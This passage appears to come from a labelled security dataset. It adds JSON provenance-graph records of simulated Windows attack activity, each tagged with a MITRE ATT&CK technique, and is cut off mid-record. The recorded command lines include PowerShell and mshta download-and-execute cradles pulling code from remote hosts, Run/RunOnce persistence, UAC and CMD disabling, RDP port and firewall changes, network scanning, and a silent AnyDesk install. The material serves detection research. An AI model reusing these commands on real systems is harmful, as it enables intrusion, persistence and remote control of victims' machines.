+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$RunOnceKey = \\\"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\"; set-itemproperty $RunOnceKey \\\"NextRun\\\" 2021.12.01(1)\"",
+        "Type": "Process",
+        "Pid": 3136
+    },
+    "dstNode": {
+        "UUID": "dfae43e1-a63c-5ff0-9fa7-45b4ce24148b",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun",
+        "Type": "Registry",
+        "Value": "2021.12.01(1)"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655174300,
+    "label": "T1547.001_4b71ebb2f6f6a01235ba240fa40ce978"
+}
+{
+    "srcNode": {
+        "UUID": "c237cb94-01b4-5e34-ac78-5dba7c28a71d",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$RunOnceKey = \\\"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\"; set-itemproperty $RunOnceKey \\\"NextRun\\\" 2021.12.01(1)\"",
+        "Type": "Process",
+        "Pid": 3136
+    },
+    "dstNode": {
+        "UUID": "dfae43e1-a63c-5ff0-9fa7-45b4ce24148b",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun",
+        "Type": "Registry",
+        "Value": "2021.12.01(1)"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655174300,
+    "label": "T1547.001_4b71ebb2f6f6a01235ba240fa40ce978"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://eresourcesmoneymarket.com/JbVwdgaV6l/P34KJnkbASUWPzEYIgcWQnt7Yn9leGV9eg==') | Out-File \\\"2021.12.01(1)\\\"; Invoke-Item \\\"2021.12.01(1)\\\"\"",
+        "Pid": 3760,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "dd534de1-51f2-5ba6-ada3-2e34dbdfc51a",
+        "Name": "schtasks.exe",
+        "Image": "C:\\Windows\\system32\\schtasks.exe",
+        "Cmdline": "schtasks /create /tn \"RemoteAccess\" /sc onlogon /tr \"2021.12.01(1)\"",
+        "Type": "Process",
+        "Pid": 3584
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174302,
+    "label": "T1053.005_5db2884b6ca3ab932848f295a3896dc0"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "9a7d945f-b465-5333-b48a-2325b4f70630",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest -OutFile C:\\Users\\matthew10\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = \\\"C:\\Users\\\\\\\" + matthew10 + \\\"\\Desktop\\AnyDesk.exe\\\"; Start-Process $file1 /S;\"",
+        "Type": "Process",
+        "Pid": 3824
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179072,
+    "label": "T1219_7dabcbecab0334b115feefab1630f84a"
+}
+{
+    "srcNode": {
+        "UUID": "9d80baec-e2a9-527d-83ab-441cab133142",
+        "Name": "AnyDesk.exe",
+        "Image": "C:\\Users\\matthew10\\Desktop\\AnyDesk.exe",
+        "Cmdline": "\"C:\\Users\\matthew10\\Desktop\\AnyDesk.exe\" /S ",
+        "Type": "Process",
+        "Pid": 3956
+    },
+    "dstNode": {
+        "UUID": "c9ff0e0d-870e-539b-a24b-4b6e045b56d1",
+        "Name": "C:\\Users\\matthew10\\Desktop\\AnyDesk.exe",
+        "Type": "File"
+    },
+    "relation": "QueryNetworkOpenInformationFile",
+    "timestamp": 1655179075,
+    "label": "T1219_7dabcbecab0334b115feefab1630f84a"
+}
+{
+    "srcNode": {
+        "UUID": "026b531b-0f1c-578c-9dbf-3252a97d8b2a",
+        "Name": "AnyDesk.exe",
+        "Image": "C:\\Users\\matthew10\\Desktop\\AnyDesk.exe",
+        "Cmdline": "\"C:\\Users\\matthew10\\Desktop\\AnyDesk.exe\" --local-control",
+        "Type": "Process",
+        "Pid": 6112
+    },
+    "dstNode": {
+        "UUID": "c9ff0e0d-870e-539b-a24b-4b6e045b56d1",
+        "Name": "C:\\Users\\matthew10\\Desktop\\AnyDesk.exe",
+        "Type": "File"
+    },
+    "relation": "QueryDirectory",
+    "timestamp": 1655179079,
+    "label": "T1219_7dabcbecab0334b115feefab1630f84a"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "0d9acc20-789c-5749-8e70-53b5b8d8d8d5",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module ./basic_scanner.ps1;$ports = @(22, 53, 80, 445);Get-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \\\"Disconnected\\\"} | Get-NetIPaddress -AddressFamily IPv4 | %{    $ipv4 = $_.IPAddress;    $prefixLength = $_.PrefixLength;    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;};\"",
+        "Type": "Process",
+        "Pid": 7432
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179081,
+    "label": "T1046_5a4cb2be-2684-4801-9355-3a90c91e0004"
+}
+{
+    "srcNode": {
+        "UUID": "0d9acc20-789c-5749-8e70-53b5b8d8d8d5",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module ./basic_scanner.ps1;$ports = @(22, 53, 80, 445);Get-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \\\"Disconnected\\\"} | Get-NetIPaddress -AddressFamily IPv4 | %{    $ipv4 = $_.IPAddress;    $prefixLength = $_.PrefixLength;    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;};\"",
+        "Type": "Process",
+        "Pid": 7432
+    },
+    "dstNode": {
+        "UUID": "3744be9f-9243-5a61-9d0e-1e1d2c96f671",
+        "Srcaddress": "DESKTOP-BA1RQFC.blueteam.com",
+        "Dstaddress": "192.168.48.126:microsoft-ds",
+        "Port": "63364",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655179085,
+    "label": "T1046_5a4cb2be-2684-4801-9355-3a90c91e0004"
+}
+{
+    "srcNode": {
+        "UUID": "0d9acc20-789c-5749-8e70-53b5b8d8d8d5",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module ./basic_scanner.ps1;$ports = @(22, 53, 80, 445);Get-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \\\"Disconnected\\\"} | Get-NetIPaddress -AddressFamily IPv4 | %{    $ipv4 = $_.IPAddress;    $prefixLength = $_.PrefixLength;    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;};\"",
+        "Type": "Process",
+        "Pid": 7432
+    },
+    "dstNode": {
+        "UUID": "9860a631-5e26-5291-811e-d3d8538c0ce7",
+        "Srcaddress": "DESKTOP-BA1RQFC.blueteam.com",
+        "Dstaddress": "192.168.48.198:microsoft-ds",
+        "Port": "63653",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655179085,
+    "label": "T1046_5a4cb2be-2684-4801-9355-3a90c91e0004"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"FacturaDezembro-258714-2019-10_5.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "bc8ba2ba-506e-55f8-bd43-aa765e5b80bb",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\" /v \"DisableCMD\" /t REG_DWORD /d \"1\" /f",
+        "Type": "Process",
+        "Pid": 10832
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180425,
+    "label": "T1112_35c0360d226cf38104f300d9d57ce60e"
+}
+{
+    "srcNode": {
+        "UUID": "bc8ba2ba-506e-55f8-bd43-aa765e5b80bb",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\" /v \"DisableCMD\" /t REG_DWORD /d \"1\" /f",
+        "Type": "Process",
+        "Pid": 10832
+    },
+    "dstNode": {
+        "UUID": "26a26bbc-41d5-5d1e-8203-6dde369f40d2",
+        "Key": "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655180427,
+    "label": "T1112_35c0360d226cf38104f300d9d57ce60e"
+}
+{
+    "srcNode": {
+        "UUID": "bc8ba2ba-506e-55f8-bd43-aa765e5b80bb",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\" /v \"DisableCMD\" /t REG_DWORD /d \"1\" /f",
+        "Type": "Process",
+        "Pid": 10832
+    },
+    "dstNode": {
+        "UUID": "26a26bbc-41d5-5d1e-8203-6dde369f40d2",
+        "Key": "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD",
+        "Type": "Registry",
+        "Value": "1"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655180427,
+    "label": "T1112_35c0360d226cf38104f300d9d57ce60e"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"FacturaDezembro-258714-2019-10_5.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "4eacb16f-85ad-5f3b-8a73-bfe01eb6b484",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"DisableRealtimeMonitoring\" /t REG_SZ /F /D \"libcurl(1).dll\"",
+        "Type": "Process",
+        "Pid": 228
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180429,
+    "label": "T1547.001_163b023f43aba758d36f524d146cb8ea"
+}
+{
+    "srcNode": {
+        "UUID": "4eacb16f-85ad-5f3b-8a73-bfe01eb6b484",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"DisableRealtimeMonitoring\" /t REG_SZ /F /D \"libcurl(1).dll\"",
+        "Type": "Process",
+        "Pid": 228
+    },
+    "dstNode": {
+        "UUID": "63acc5bf-2cfb-5443-a00c-c9f7436b14ba",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DisableRealtimeMonitoring",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655180430,
+    "label": "T1547.001_163b023f43aba758d36f524d146cb8ea"
+}
+{
+    "srcNode": {
+        "UUID": "4eacb16f-85ad-5f3b-8a73-bfe01eb6b484",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"DisableRealtimeMonitoring\" /t REG_SZ /F /D \"libcurl(1).dll\"",
+        "Type": "Process",
+        "Pid": 228
+    },
+    "dstNode": {
+        "UUID": "2067978f-675b-584f-8024-aef739789240",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "Type": "Registry"
+    },
+    "relation": "RegCloseKey",
+    "timestamp": 1655180430,
+    "label": "T1547.001_163b023f43aba758d36f524d146cb8ea"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"FacturaDezembro-258714-2019-10_5.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "a639041f-e122-57fb-bf52-4b2db3be5124",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "wmic  useraccount get /ALL /format:csv",
+        "Type": "Process",
+        "Pid": 10492
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180431,
+    "label": "T1047_b0255b5120cbabc062d8d4510a142c3b"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "6a71f964-ed7e-52f5-9b24-ee239bde1dc5",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "Set-Content -Path c:\\users\\administrator\\appdata\\local\\temp\\werd9cd.tmp.appcompat.txt -Value find /dev/shm/.../...BORG.../ -size 0 -exec rm {} ;",
+        "Type": "Process",
+        "Pid": 7152
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180433,
+    "label": "T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9"
+}
+{
+    "srcNode": {
+        "UUID": "6a71f964-ed7e-52f5-9b24-ee239bde1dc5",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "Set-Content -Path c:\\users\\administrator\\appdata\\local\\temp\\werd9cd.tmp.appcompat.txt -Value find /dev/shm/.../...BORG.../ -size 0 -exec rm {} ;",
+        "Type": "Process",
+        "Pid": 7152
+    },
+    "dstNode": {
+        "UUID": "14c5b9da-c96e-547e-8b85-7e43bd4c1b19",
+        "Name": "c:\\users\\administrator\\appdata\\local\\temp\\werd9cd.tmp.appcompat.txt",
+        "Type": "File"
+    },
+    "relation": "ReadFile",
+    "timestamp": 1655180434,
+    "label": "T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9"
+}
+{
+    "srcNode": {
+        "UUID": "6a71f964-ed7e-52f5-9b24-ee239bde1dc5",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "Set-Content -Path c:\\users\\administrator\\appdata\\local\\temp\\werd9cd.tmp.appcompat.txt -Value find /dev/shm/.../...BORG.../ -size 0 -exec rm {} ;",
+        "Type": "Process",
+        "Pid": 7152
+    },
+    "dstNode": {
+        "UUID": "14c5b9da-c96e-547e-8b85-7e43bd4c1b19",
+        "Name": "c:\\users\\administrator\\appdata\\local\\temp\\werd9cd.tmp.appcompat.txt",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655180434,
+    "label": "T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "627d7ff7-dc4d-5b20-bbde-df8ceebb7ed6",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\\\"http://eresourcesmoneymarket.com/JbVwdgaV6l/P34KJnkbASUWPzEYIgcWQnt7Yn9leGV9eg==\\\")\"",
+        "Type": "Process",
+        "Pid": 10688
+    },
+    "relation": "Process Create",
+    "timestamp": 1655249096,
+    "label": "T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031"
+}
+{
+    "srcNode": {
+        "UUID": "627d7ff7-dc4d-5b20-bbde-df8ceebb7ed6",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\\\"http://eresourcesmoneymarket.com/JbVwdgaV6l/P34KJnkbASUWPzEYIgcWQnt7Yn9leGV9eg==\\\")\"",
+        "Type": "Process",
+        "Pid": 10688
+    },
+    "dstNode": {
+        "UUID": "63cd30fe-ba34-5eb6-8d07-8aff38d1bdd1",
+        "Srcaddress": "laptop-77.myers-davis.biz",
+        "Dstaddress": "172.217.2.106",
+        "Port": "38425",
+        "Type": "Network"
+    },
+    "relation": "TCP Receive",
+    "timestamp": 1655249098,
+    "label": "T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031"
+}
+{
+    "srcNode": {
+        "UUID": "5f8d9109-d368-574b-a391-6314028dbda1",
+        "Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c IEX rJxXgAcLrKwO",
+        "Pid": 37896,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "ceba164b-2f4c-5f38-b828-f7b262c99efb",
+        "Name": "rJxXgAcLrKwO",
+        "Image": "rJxXgAcLrKwO",
+        "Cmdline": "rJxXgAcLrKwO",
+        "Pid": 73006,
+        "Type": "Process"
+    },
+    "relation": "Process Create",
+    "timestamp": 1655249099,
+    "label": "T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031"
+}
+{
+    "srcNode": {
+        "UUID": "ceba164b-2f4c-5f38-b828-f7b262c99efb",
+        "Name": "rJxXgAcLrKwO",
+        "Image": "rJxXgAcLrKwO",
+        "Cmdline": "rJxXgAcLrKwO",
+        "Pid": 73006,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "256f5668-4626-5322-b58b-5da7551ed862",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\"",
+        "Type": "Process",
+        "Pid": 10292
+    },
+    "relation": "Process Create",
+    "timestamp": 1655249103,
+    "label": "T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c"
+}
+{
+    "srcNode": {
+        "UUID": "256f5668-4626-5322-b58b-5da7551ed862",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\"",
+        "Type": "Process",
+        "Pid": 10292
+    },
+    "dstNode": {
+        "UUID": "8a6cbbfa-c8f5-5fd5-a9de-52beb89f87e6",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
+        "Type": "Registry",
+        "Value": "0"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655249105,
+    "label": "T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c"
+}
+{
+    "srcNode": {
+        "UUID": "256f5668-4626-5322-b58b-5da7551ed862",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\"",
+        "Type": "Process",
+        "Pid": 10292
+    },
+    "dstNode": {
+        "UUID": "8a6cbbfa-c8f5-5fd5-a9de-52beb89f87e6",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
+        "Type": "Registry",
+        "Value": "0"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655249105,
+    "label": "T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c"
+}
+{
+    "srcNode": {
+        "UUID": "ceba164b-2f4c-5f38-b828-f7b262c99efb",
+        "Name": "rJxXgAcLrKwO",
+        "Image": "rJxXgAcLrKwO",
+        "Cmdline": "rJxXgAcLrKwO",
+        "Pid": 73006,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "1b09a1e3-d834-5054-a107-c967a3274b23",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "$env:username",
+        "Type": "Process",
+        "Pid": 7644
+    },
+    "relation": "Process Create",
+    "timestamp": 1655249110,
+    "label": "T1033_c0da588f-79f0-4263-8998-7496b1a40596"
+}
+{
+    "srcNode": {
+        "UUID": "ceba164b-2f4c-5f38-b828-f7b262c99efb",
+        "Name": "rJxXgAcLrKwO",
+        "Image": "rJxXgAcLrKwO",
+        "Cmdline": "rJxXgAcLrKwO",
+        "Pid": 73006,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "c8375489-188f-50ec-a9b3-427127e140e9",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value",
+        "Type": "Process",
+        "Pid": 11056
+    },
+    "relation": "Process Create",
+    "timestamp": 1655249110,
+    "label": "T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba"
+}
+{
+    "srcNode": {
+        "UUID": "ceba164b-2f4c-5f38-b828-f7b262c99efb",
+        "Name": "rJxXgAcLrKwO",
+        "Image": "rJxXgAcLrKwO",
+        "Cmdline": "rJxXgAcLrKwO",
+        "Pid": 73006,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "f6537c50-4711-5bb6-b4f2-ee7eeb8ec0c7",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 22642 -f && netsh advfirewall firewall add rule name=\"All ICMP V4\" dir=in action=allow protocol=TCP localport=22642",
+        "Type": "Process",
+        "Pid": 4984
+    },
+    "relation": "Process Create",
+    "timestamp": 1655249112,
+    "label": "T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89"
+}
+{
+    "srcNode": {
+        "UUID": "919499ea-7183-5f8b-b698-c7ae5c0cc4b4",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 22642 -f ",
+        "Type": "Process",
+        "Pid": 8936
+    },
+    "dstNode": {
+        "UUID": "8ab6391a-2696-5b3f-abc9-34b3763e2c9c",
+        "Key": "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
+        "Type": "Registry"
+    },
+    "relation": "RegCreateKey",
+    "timestamp": 1655249115,
+    "label": "T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89"
+}
+{
+    "srcNode": {
+        "UUID": "919499ea-7183-5f8b-b698-c7ae5c0cc4b4",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 22642 -f ",
+        "Type": "Process",
+        "Pid": 8936
+    },
+    "dstNode": {
+        "UUID": "8ab6391a-2696-5b3f-abc9-34b3763e2c9c",
+        "Key": "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
+        "Type": "Registry"
+    },
+    "relation": "RegCloseKey",
+    "timestamp": 1655249115,
+    "label": "T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "fc18d78c-8815-5984-8a88-35b97dd004ad",
+        "Name": "mshta.exe",
+        "Image": "C:\\Windows\\system32\\mshta.exe",
+        "Cmdline": "mshta.exe  javascript:a=GetObject(\"https://ppthgbsdajfbkasdjfj8.s3.amazonaws.com:443/P-8-13.dll\").Exec();close()",
+        "Type": "Process",
+        "Pid": 9664
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174187,
+    "label": "T1059.001_6efbccc1869e8cd618c0d3ecda407d5f"
+}
+{
+    "srcNode": {
+        "UUID": "fc18d78c-8815-5984-8a88-35b97dd004ad",
+        "Name": "mshta.exe",
+        "Image": "C:\\Windows\\system32\\mshta.exe",
+        "Cmdline": "mshta.exe  javascript:a=GetObject(\"https://ppthgbsdajfbkasdjfj8.s3.amazonaws.com:443/P-8-13.dll\").Exec();close()",
+        "Type": "Process",
+        "Pid": 9664
+    },
+    "dstNode": {
+        "UUID": "16c21c98-93f1-503a-927d-fed434c16743",
+        "Name": "Retrive4075693065230196915.vbs",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655174190,
+    "label": "T1059.001_6efbccc1869e8cd618c0d3ecda407d5f"
+}
+{
+    "srcNode": {
+        "UUID": "fc18d78c-8815-5984-8a88-35b97dd004ad",
+        "Name": "mshta.exe",
+        "Image": "C:\\Windows\\system32\\mshta.exe",
+        "Cmdline": "mshta.exe  javascript:a=GetObject(\"https://ppthgbsdajfbkasdjfj8.s3.amazonaws.com:443/P-8-13.dll\").Exec();close()",
+        "Type": "Process",
+        "Pid": 9664
+    },
+    "dstNode": {
+        "UUID": "cecf1b57-667e-52ec-b9e6-03e9799b4894",
+        "Srcaddress": "laptop-22.richardson.info",
+        "Dstaddress": "23.45.57.248",
+        "Port": "22499",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655174190,
+    "label": "T1059.001_6efbccc1869e8cd618c0d3ecda407d5f"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "a8252a2b-c901-5e57-bd50-038b7f49b414",
+        "Name": "mavinject.exe",
+        "Image": "C:\\Windows\\system32\\mavinject.exe",
